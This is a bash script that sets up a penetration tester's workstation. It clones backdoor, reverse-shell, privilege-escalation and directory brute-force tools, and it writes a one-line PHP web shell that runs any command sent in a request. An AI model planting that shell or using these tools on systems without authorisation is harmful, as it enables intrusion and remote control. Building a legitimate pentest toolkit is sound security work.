#!/usr/bin/env bash

# if /mnt/host/.ssh exists then
# cp -r /mnt/host/.ssh/* ~/.ssh
# chmod 600 ~/.ssh/id_rsa

mkdir ~/Documents/github
git clone git@github.com:GlasgOWned/PenTesting.git ~/Documents/github/PenTesting

mkdir -p ~/.dotfiles/git
svn checkout https://github.com/git/git/trunk/contrib/completion ~/.dotfiles/git/

#### git config
git config --global user.name Glasgow
git config --global user.email Glasgow@localhost

#### Github
# Python PTY backdoors
git clone https://github.com/infodox/python-pty-shells.git ~/opt/python-pty-shells

# Exploit Suggesters and enumeration
git clone https://github.com/sleventyeleven/linuxprivchecker.git ~/opt/Enumeration/Linux/linuxprivchecker
git clone https://github.com/mzet-/linux-exploit-suggester.git ~/opt/Enumeration/Linux/linux-exploit-suggester
git clone https://github.com/NullArray/MIDA-Multitool.git ~/opt/Enumeration/MIDA-Multitool
git clone https://github.com/NullArray/RootHelper.git ~/opt/Enumeration/RootHelper
git clone https://github.com/diego-treitos/linux-smart-enumeration.git ~/opt/Enumeration/Linux/linux-smart-enumeration
git clone https://github.com/carlospolop/linPE.git ~/opt/Enumeration/Linux/linPE
git clone https://github.com/InteliSecureLabs/Linux_Exploit_Suggester.git ~/opt/Enumeration/Linux/Linux_Exploit_Suggester
git clone https://github.com/rebootuser/LinEnum.git ~/opt/Enumeration/Linux/LinEnum
git clone https://github.com/pentestmonkey/windows-privesc-check.git ~/opt/Enumeration/Windows/windows-privesc-check

# phpbash
git clone https://github.com/Arrexel/phpbash.git ~/opt/phpbash

# peda
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
echo "DONE! debug your program with gdb and enjoy"

# socat-shell
git clone https://github.com/cornerpirate/socat-shell.git ~/opt/socat-shell

# dirsearch - dirsearch is a simple command line tool designed to brute force directories and files in websites.
git clone https://github.com/maurosoria/dirsearch.git ~/opt/dirsearch

# eviler-winrm
git clone https://github.com/swarley/eviler-winrm.git ~/opt/eviler-winrm

# ropstar
git clone https://github.com/xct/ropstar.git ~/opt/ropstar


# simple script for php code execution
mkdir ~/opt/php
echo "<?php echo system(\$_REQUEST['var']); ?>" > ~/opt/php/cmd.php
